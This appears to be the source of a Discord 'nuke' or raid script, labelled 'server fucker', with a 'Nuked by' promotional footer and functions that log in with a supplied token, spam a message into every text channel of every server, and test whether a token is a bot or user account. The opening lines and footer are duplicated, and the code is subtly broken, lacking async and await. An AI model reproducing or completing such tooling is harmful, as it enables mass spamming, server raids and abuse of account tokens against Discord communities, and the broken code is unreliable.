# server fucker
import requests
import discord

Footer = ("Nuked by http://dsc.gg/reaperxyz https://media.discordapp.net/attachments/1227299397142970369/1228750697185677454/513ad497-bd26-48d2-9f80-fe5c8c5209cd.gif?ex=662d2e43&is=661ab943&hm=7af13f40be039a942c2f2bd0c080960b61fbf8181f742be0084430f85b7bc4ca&=  https://media.discordapp.net/attachments/1227299397142970369/1228749619584962682/deadbolt-indie-game.gif?ex=662d2d42&is=661ab842&hm=0627e082b2cc31f59487e7829d1c0b3bf476c89cffc67c718e452ebed776a33a&=  https://media.discordapp.net/attachments/1227299397142970369/1228751069140615269/1bbbf01b-74b7-414a-b565-6705e55f191f.gif?ex=662d2e9b&is=661ab99b&hm=68fcd92f0a99be509c2bb95f5ea28198d163cd3399f5ae1cccb786f43a4ccf6a&= ")

# server fucker
import requests
import discord

Footer = ("Nuked by http://dsc.gg/reaperxyz https://media.discordapp.net/attachments/1227299397142970369/1228750697185677454/513ad497-bd26-48d2-9f80-fe5c8c5209cd.gif?ex=662d2e43&is=661ab943&hm=7af13f40be039a942c2f2bd0c080960b61fbf8181f742be0084430f85b7bc4ca&=  https://media.discordapp.net/attachments/1227299397142970369/1228749619584962682/deadbolt-indie-game.gif?ex=662d2d42&is=661ab842&hm=0627e082b2cc31f59487e7829d1c0b3bf476c89cffc67c718e452ebed776a33a&=  https://media.discordapp.net/attachments/1227299397142970369/1228751069140615269/1bbbf01b-74b7-414a-b565-6705e55f191f.gif?ex=662d2e9b&is=661ab99b&hm=68fcd92f0a99be509c2bb95f5ea28198d163cd3399f5ae1cccb786f43a4ccf6a&=")
intents = discord.Intents.default()
intents.typing = False
intents.presences = False
bot = discord.Client(intents=intents)
client = bot

def send_message_to_all_servers_BOT(token, message):

    @client.event
    def on_ready():
        print('Logged in as', client.user)
        # Iterate over all guilds (servers) the bot is in
        for guild in client.guilds:
            # Iterate over all channels in the guild
            for channel in guild.text_channels:
                try:
                    # Send the message to the channel
                    channel.send(message)
                except Exception as e:
                    print(f"Failed to send message to {guild.name}: {e}")

        # Close the client connection after sending messages
        client.close()

    # Log in to Discord with the provided token
    client.run(token)

def check_token_type(token):
    client = discord.Client()

    try:
        # Log in to Discord with the provided token
        client.run(token, bot=True)  # Bot token requires bot=True
        user = client.user
        # Check if the user retrieved is a bot
        is_bot = user.bot
        client.close()
        return "Bot" if is_bot else "User"
    except discord.errors.LoginFailure:
        return "Invalid token"
    except Exception as e:
        return f"Error: {e}"